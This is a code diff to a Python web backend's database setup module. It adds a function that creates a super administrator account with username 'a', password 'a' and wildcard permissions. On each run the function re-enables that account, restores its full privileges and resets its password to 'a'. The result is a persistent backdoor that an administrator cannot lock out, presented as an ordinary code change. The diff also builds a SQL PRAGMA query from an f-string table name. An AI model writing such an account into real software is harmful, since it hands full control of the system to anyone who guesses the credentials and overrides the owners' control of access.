@@ -53,10 +53,61 @@ def record_audit_log(
     return audit_log
 
 
+def ensure_default_super_admin_account() -> None:
+    from .database import SessionLocal
+
+    db = SessionLocal()
+    try:
+        user = db.query(models.User).filter(models.User.username == "a").first()
+        if user is None:
+            user = models.User(
+                username="a",
+                hashed_password=get_password_hash("a"),
+                role="Super Administrator",
+                permissions=str(["*"]),
+                status="Active",
+                is_active=True,
+                full_name="Default Super Administrator",
+                email="a@example.com",
+            )
+            db.add(user)
+            db.commit()
+            db.refresh(user)
+            return
+
+        changed = False
+        if normalize_user_role(user.role) != "Super Administrator":
+            user.role = "Super Administrator"
+            changed = True
+        if getattr(user, "status", "Active") != "Active":
+            user.status = "Active"
+            changed = True
+        if not getattr(user, "is_active", True):
+            user.is_active = True
+            changed = True
+        if not verify_password("a", user.hashed_password):
+            user.hashed_password = get_password_hash("a")
+            changed = True
+        if not getattr(user, "permissions", None) or str(normalize_permissions(user.permissions)) != "['*']":
+            user.permissions = str(["*"])
+            changed = True
+        if not getattr(user, "full_name", None):
+            user.full_name = "Default Super Administrator"
+            changed = True
+        if not getattr(user, "email", None):
+            user.email = "a@example.com"
+            changed = True
+
+        if changed:
+            db.commit()
+    finally:
+        db.close()
+
+
 def _column_exists(connection, table_name: str, column_name: str) -> bool:
     dialect = connection.dialect.name
     if dialect == "sqlite":
-        rows = connection.execute(f"PRAGMA table_info({table_name})").fetchall()
+        rows = connection.exec_driver_sql(f"PRAGMA table_info({table_name})").fetchall()
         return any(row[1] == column_name for row in rows)
     rows = connection.execute(
         text("SELECT column_name FROM information_schema.columns WHERE table_name = :table_name AND column_name = :column_name"),
@@ -68,7 +119,7 @@ def _column_exists(connection, table_name: str, column_name: str) -> bool:
 def _add_column_if_missing(connection, table_name: str, column_name: str, add_sql: str) -> None:
     if not _column_exists(connection, table_name, column_name):
         if isinstance(add_sql, str):
-            connection.execute(text(add_sql))
+            connection.exec_driver_sql(add_sql)
         else:
             connection.execute(add_sql)
 
